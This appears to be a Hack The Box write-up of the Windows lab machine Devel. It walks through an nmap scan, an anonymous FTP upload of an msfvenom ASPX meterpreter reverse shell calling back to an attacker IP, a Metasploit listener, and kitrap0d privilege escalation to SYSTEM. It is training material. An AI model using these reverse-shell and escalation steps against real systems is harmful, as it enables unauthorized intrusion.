# HTB_Devel
This is my writeup for the HTB machine Devel.

🎃 Pumpkin Spice HTB Writeup: Devel Machine 🎃
🌿 Introduction
Welcome to my spooky-themed Hack The Box writeup for the Devel machine! This is a beginner-friendly Windows box that teaches the dangers of default configurations and anonymous FTP access. Grab your pumpkin spice latte ☕ and let’s hack our way to SYSTEM!

📜 Machine Info
Attribute	Details
Name:	Devel
OS:	Windows
Difficulty:	Easy
IP Address:	10.10.10.5
Creator: Lantern
Skills Learned	FTP Misconfig, IIS Exploitation, Windows PrivEsc
(Insert cute pumpkin-themed divider image here 🎃)

🔍 Enumeration
1. Nmap Scan
We start by scanning the machine with Nmap:

```bash
nmap -T4 -A -v 10.10.10.5
```

Findings:

Port 21 (FTP): Microsoft FTP (Anonymous login allowed! 👀)

Port 80 (HTTP): Microsoft IIS 7.5

![1 nmap](https://github.com/user-attachments/assets/7ad31e61-59ef-4586-b32a-eb5f23f638fb)


2. Web Directory Brute-Forcing
Ran Dirbuster but found nothing interesting—so FTP is our way in!

⚡ Exploitation
1. Anonymous FTP Access
Logged in with:

```bash
ftp 10.10.10.5
```

Username: anonymous  
Password: (anything)  
Found files:

lisstart.htm  
welcome.png  

![2 ftp login](https://github.com/user-attachments/assets/a5a7728e-1d4e-4cb9-a507-49e07780a803)


2. Uploading a Reverse Shell
Since FTP allows uploading files, we generate an ASPX reverse shell with msfvenom:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f aspx > devel.aspx
```
Then, upload it:

ftp> put devel.aspx

3. Triggering the Shell
Set up a Metasploit listener:

```bash
msfconsole  
use multi/handler  
set payload windows/meterpreter/reverse_tcp  
set LHOST <YOUR_IP>  
set LPORT 4444  
exploit
```
 
Visit http://10.10.10.5/devel.aspx to trigger the shell!

Boom! We’re in as IIS APPPOOL\Web.

![3 reverse shell](https://github.com/user-attachments/assets/753ba440-0b6d-425d-ab6c-cec2ec6c4d4c)


🔼 Privilege Escalation
1. Checking System Info
```bash
meterpreter> sysinfo
```
  
(Insert sysinfo output here 📸)

2. Using local_exploit_suggester
```bash
use post/multi/manage/local_exploit_suggester  
set SESSION 1  
run
```

Recommended exploit: ms10_015_kitrap0d

![4 meterpreter](https://github.com/user-attachments/assets/06d37e41-c20d-4275-9543-087c0ee1c8e5)


3. Exploiting for SYSTEM
```bash
use exploit/windows/local/ms10_015_kitrap0d  
set SESSION 1  
set LHOST <YOUR_IP>  
exploit
```
 
Success! Now we’re NT AUTHORITY\SYSTEM!


🏴 Flags Captured!
User Flag
```bash
meterpreter> cat c:\Users\babis\Desktop\user.txt
```

![5 flags](https://github.com/user-attachments/assets/ddf26592-d36b-45f3-a00b-ca713c9cb7ab)


Root Flag
```bash
meterpreter> cat c:\Users\Administrator\Desktop\root.txt
```


🎃 Conclusion & Lessons Learned
Default FTP configurations are dangerous!

Always disable anonymous access if not needed.

Old Windows exploits (like ms10_015_kitrap0d) still work!

Happy Hacking! 🎃🎃🎃🎃



